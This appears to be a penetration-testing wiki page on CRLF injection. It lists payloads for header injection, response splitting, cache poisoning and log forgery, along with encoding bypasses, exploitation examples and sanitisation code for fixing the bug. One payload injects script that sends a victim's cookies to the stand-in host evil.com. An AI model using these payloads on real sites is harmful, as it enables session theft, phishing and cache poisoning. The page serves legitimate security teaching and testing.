---
tags:
  - medium
  - injection
---

# CRLF Injection

Carriage Return Line Feed (CRLF) injection occurs when an application includes user input in HTTP headers without sanitizing `\r\n` characters. This allows attackers to inject arbitrary headers or even split responses.

## TL;DR

```bash
# Basic header injection
%0d%0aSet-Cookie:malicious=value

# Response splitting
%0d%0a%0d%0a<html>Injected content</html>

# XSS via header injection
%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
```

## How It Works

HTTP uses CRLF (`\r\n` or `%0d%0a`) to separate headers:

```http
HTTP/1.1 302 Found
Location: /redirect?url=USER_INPUT
Set-Cookie: session=abc123
```

If `USER_INPUT` contains `%0d%0a`, attacker can inject new headers:

```http
HTTP/1.1 302 Found
Location: /redirect?url=
Set-Cookie: admin=true
Set-Cookie: session=abc123
```

## Attack Vectors

### 1. Header Injection

Inject arbitrary headers into the response:

```
# Set malicious cookie
?redirect=%0d%0aSet-Cookie:admin=true

# Inject X-XSS-Protection bypass
?redirect=%0d%0aX-XSS-Protection:0
```

### 2. Response Splitting

Terminate headers and inject body content:

```
# URL encoded payload
?param=%0d%0a%0d%0a<html><script>document.location='https://evil.com/?c='+document.cookie</script></html>

# Double CRLF terminates headers, starts body
```

### 3. Cache Poisoning

Combine with cache headers to persist attack:

```
?redirect=%0d%0aContent-Length:50%0d%0a%0d%0aMalicious cached content
```

### 4. Log Injection

Inject fake log entries to cover tracks or create confusion:

```
?param=normal%0d%0a[2024-01-01] Admin login successful from 127.0.0.1
```

## Common Vulnerable Parameters

```
# Redirect/Location headers
redirect, url, next, return_url, callback

# Custom headers
X-Forwarded-For, X-Custom-Header, Referer

# Cookie values
session, user, preferences

# Log inputs
username, action, filename
```

## Bypass Techniques

### Encoding Variations

```bash
# Standard URL encoding
%0d%0a

# Double encoding
%250d%250a

# Mixed case
%0D%0A

# Unicode variations
%E5%98%8A%E5%98%8D  # UTF-8 encoded CRLF

# Overlong UTF-8
%C0%8D%C0%8A

# Null byte insertion
%00%0d%0a
```

### Character Alternatives

```bash
# Just LF (works on some servers)
%0a

# Just CR
%0d

# Vertical tab + form feed
%0b%0c

# Unicode line separators
%E2%80%A8  # Line Separator (U+2028)
%E2%80%A9  # Paragraph Separator (U+2029)
```

### Filter Bypass

```bash
# If \r\n blocked but %0d%0a works
redirect=%0d%0aSet-Cookie:evil

# If %0d blocked, try %0D
redirect=%0D%0ASet-Cookie:evil

# Mixed encoding
redirect=%0d%0ASet-Cookie:evil
```

## Detection

### Manual Testing

1. **Identify reflection points** — Parameters reflected in headers
2. **Test basic injection** — `%0d%0aX-Injected:true`
3. **Check response headers** — Look for injected header
4. **Try response splitting** — `%0d%0a%0d%0a<body>`

### Automated Detection

```bash
# Burp Intruder with CRLF payloads
# Check for Set-Cookie or Content-Type injection

# Basic curl test
curl -v "https://target.com/redirect?url=%0d%0aX-Test:injected"
```

## Exploitation

### XSS via Content-Type

```
?redirect=%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(document.domain)</script>
```

### Session Fixation

```
?redirect=%0d%0aSet-Cookie:session=attacker_controlled;Path=/;HttpOnly
```

### Redirect to Phishing

```
?redirect=%0d%0aLocation:https://evil.com%0d%0a%0d%0a
```

### Web Cache Deception

```
# Poison cache with malicious content
?page=%0d%0aContent-Type:text/html%0d%0aX-Cache:HIT%0d%0a%0d%0a<html>Phishing</html>
```

## Chaining Opportunities

| Chain | Impact |
|-------|--------|
| CRLF → XSS | Execute JavaScript via injected Content-Type |
| CRLF → Session Fixation | Fix victim's session to attacker-known value |
| CRLF → Open Redirect | Inject Location header |
| CRLF → Cache Poisoning | Persist malicious content |
| CRLF → CORS Bypass | Inject Access-Control-Allow-Origin |

## Impact Assessment

| Scenario | Severity |
|----------|----------|
| Header injection only | Low-Medium |
| Session fixation | Medium |
| XSS via response splitting | High |
| Cache poisoning | High |
| Full response control | Critical |

## Remediation

### Input Validation

```python
# Python - Strip CRLF characters
import re
def sanitize_header_value(value):
    return re.sub(r'[\r\n]', '', value)
```

```javascript
// JavaScript - Remove CRLF
function sanitizeHeaderValue(value) {
    return value.replace(/[\r\n]/g, '');
}
```

### Framework Protections

Most modern frameworks automatically encode or reject CRLF in headers:

- **Express.js** — Throws error on CRLF in setHeader()
- **Django** — HttpResponseRedirect sanitizes
- **Rails** — redirect_to encodes by default
- **Spring** — Header injection protection built-in

### Testing After Fix

```bash
# Verify CRLF rejected or encoded
curl -v "https://target.com/redirect?url=%0d%0aX-Test:injected"
# Should NOT see X-Test header in response
```

## Related Vulnerabilities

- [Open Redirect](../client-side/open-redirect.md) — Often found together
- [HTTP Request Smuggling](../infrastructure/http-smuggling.md) — Similar header manipulation
- [XSS](../client-side/xss/index.md) — CRLF can lead to XSS

## References

- [OWASP CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)
- [PortSwigger HTTP Response Splitting](https://portswigger.net/web-security/request-smuggling)
- [HackerOne Reports (search: CRLF)](https://hackerone.com/hacktivity?querystring=CRLF)
